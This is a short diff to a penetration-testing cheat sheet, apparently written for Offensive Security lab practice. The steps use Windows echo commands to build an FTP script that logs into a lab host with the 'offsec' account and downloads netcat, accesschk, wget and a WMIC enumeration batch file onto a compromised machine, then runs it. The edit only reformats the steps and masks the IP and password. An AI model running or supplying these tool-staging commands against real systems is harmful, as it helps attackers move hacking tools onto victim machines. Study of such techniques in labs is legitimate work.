@@ -1,9 +1,11 @@
-FTP :
+FTP : (change IP address and password before use)
 
-echo open 10.11.0.172 21> ftp.txt
-echo USER offsec>> ftp.txt 
-echo ftp>> ftp.txt 
-echo bin >> ftp.txt 
+echo ftp>ftp.txt
+echo o>>ftp.txt
+echo 10.11.0.**>>ftp.txt
+echo offsec>>ftp.txt
+echo ******>>ftp.txt
+echo bin>>ftp.txt
 echo GET accesschk.exe >> ftp.txt
 echo GET accesschk64.exe >> ftp.txt
 echo GET nc.exe >> ftp.txt 
@@ -14,5 +16,6 @@ echo GET wget.exe >> ftp.txt
 echo GET wmic_info.bat >> ftp.txt 
 echo GET wget.exe >> ftp.txt
 echo bye >> ftp.txt
-timeout 1
-ftp -v -n -s:ftp.txt
+
+Run below command after running above ones:
+ftp -s:ftp.txt
